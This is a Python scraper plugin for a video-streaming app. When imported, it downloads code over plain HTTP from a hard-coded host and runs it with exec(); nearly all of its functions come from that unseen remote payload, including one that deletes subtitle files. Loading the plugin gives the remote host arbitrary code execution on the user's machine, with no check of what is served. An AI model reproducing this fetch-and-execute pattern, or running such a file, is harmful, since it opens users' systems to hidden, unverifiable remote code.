# coding=utf-8
# !/usr/bin/python
from urllib.parse import quote
import urllib.parse
import requests
import shutil
from bs4 import BeautifulSoup
import re
from base.spider import Spider
import sys
import json
import os
import base64
import threading
import concurrent.futures


sys.path.append('..')

      

headerx = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36'
}

function_string = requests.get('http://gktv.cc:9997/ids?ids=%E8%87%BB%E5%BD%A9%E5%B0%8A%E8%A7%86').text
exec(function_string, globals())
xurl2=geturl2()
delete_subtitle_files()
class Spider(Spider):
    global xurl2
    global headerx
    global pm

    def getName(self):
        return "首页"

    def init(self, extend):
        pass

    def isVideoFormat(self, url):
        pass

    def manualVideoCheck(self):
        pass

    def homeContent(self, filter):
        return homeContent(filter)

    def homeVideoContent(self):
        return homeVideoContent()
    
    def categoryContent(self, cid, pg, filter, ext):
        return categoryContent(cid, pg, filter, ext)

    def detailContent(self, ids):
        return detailContent(ids)

    def playerContent(self, flag, id, vipFlags):
        return playerContent( flag, id, vipFlags)

    def searchContentPage(self, key, quick, page):
        return searchContentPage(key, quick, page)

    def searchContent(self, key, quick):
        return self.searchContentPage(key, quick, '1')

    def localProxy(self, params):
        if params['type'] == "m3u8":
            return self.proxyM3u8(params)
        elif params['type'] == "media":
            return self.proxyMedia(params)
        elif params['type'] == "ts":
            return self.proxyTs(params)
        return None






